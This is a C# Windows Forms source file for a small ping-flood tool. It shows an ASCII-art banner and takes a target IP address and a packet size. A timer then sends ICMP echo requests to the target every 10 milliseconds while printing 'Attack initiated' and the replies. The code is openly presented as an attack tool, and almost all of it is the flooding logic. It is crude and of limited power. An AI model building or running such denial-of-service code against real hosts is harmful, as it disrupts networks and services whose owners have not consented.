﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace WindowsFormsApp7
{
    public partial class Form1 : Form
    {
        Timer timer = new Timer() {Interval = 10};
        IPAddress _ipAddress;
        int _bufferSize;
        int zeit;

        public Form1()
        {
            InitializeComponent();
            this.zeit = 1000;
            timer.Tick += (sender, e) => SendPing(_ipAddress, _bufferSize);
            textBox3.Visible = false;
            progressBar1.Visible = false;
            textBox4.Text = $"  .d8888b.   .d8888b.  8888888b.   .d8888b.{Environment.NewLine}";
            textBox4.Text += $" d88P  Y88b d88P  Y88b 888   Y88b d88P  Y88b{Environment.NewLine}";
            textBox4.Text += $" 888    888 888    888 888    888      .d88P{Environment.NewLine}";
            textBox4.Text += $" 888        888    888 888   d88P     8888{Environment.NewLine}";
            textBox4.Text += $" 888        888    888 8888888P         Y8b.{Environment.NewLine}";
            textBox4.Text += $" 888    888 888    888 888 T88b   888    888 {Environment.NewLine}";
            textBox4.Text += $" Y88b  d88P Y88b  d88P 888  T88b  Y88b  d88P{Environment.NewLine}";
            textBox4.Text += $"   Y8888P     Y8888P   888   T88b   Y8888P {Environment.NewLine}";
            textBox4.Text += $"{Environment.NewLine}";
            textBox4.Text += $"{Environment.NewLine}";
            textBox4.Text += $"© Copyright by Core";
            Wait();
        }

        private async void Wait()
        {
            await Task.Delay(9000);
            this.Enabled = true;
            textBox4.Text = ">";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (IPAddress.TryParse(this.textBox1.Text, out IPAddress addr))
            {
                this._ipAddress = addr;
            }
            else
            {
                textBox4.Text += $">Invalid IP-address.{Environment.NewLine}";
                return;
            }
            textBox4.Text = ">";
            textBox4.Text += $"Attack initiated.{Environment.NewLine}";
            if (textBox3.Text.Trim() != "")
            {
                zeit = int.Parse(textBox3.Text);
            }
            ProgressBar();
            timer.Start();
            timer1.Start();
            
            this._bufferSize = 1; 
            if (textBox2.Text.Trim() != "")
            {
                this._bufferSize = int.Parse(this.textBox2.Text);
            }
            this.progressBar1.Value = 0;
            
        }

        private void button2_Click(object sender, EventArgs e)
        {            
            textBox4.Text += $">Attack stopped.{Environment.NewLine}";
            timer.Stop();
            timer1.Stop(); 
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            textBox3.Enabled = checkBox1.Checked;
            progressBar1.Visible = checkBox1.Checked;
            textBox3.Visible = checkBox1.Checked;
        }

        private void SendPing(IPAddress ipAddress , int bufferSize)
        {
            try
            {
                PingReply r = (new Ping()).Send(ipAddress, 1000, new byte[bufferSize], new PingOptions(64, true));
                textBox4.Text += $"Reply from {r.Address.ToString()}: bytes={r.Buffer.Length} time={r.RoundtripTime}ms status={r.Status.ToString()}{Environment.NewLine}";
            }
            catch (Exception e)
            {
                textBox4.Text += $">Could not reach host.{Environment.NewLine}";  
                this.button2.PerformClick();
                return;
            }
        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {
            textBox4.SelectionStart = textBox4.TextLength;
            textBox4.ScrollToCaret();
        }

        private void button4_Click(object sender, EventArgs e)
        { 
            textBox4.Text = ">";
            this.progressBar1.Value = 0;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            this.progressBar1.PerformStep();
            if (progressBar1.Value >= progressBar1.Maximum)
            {
                this.button2.PerformClick();
            }
        }                                                                                     
                                                                                                                                                                                                                                                                  
        public void ProgressBar()                                                              
        {                                                                                       
            progressBar1.Minimum = 0;                                                           
            progressBar1.Maximum = zeit;                                             
            progressBar1.Step = 10;                                                      
        }                                                                                       
    }
}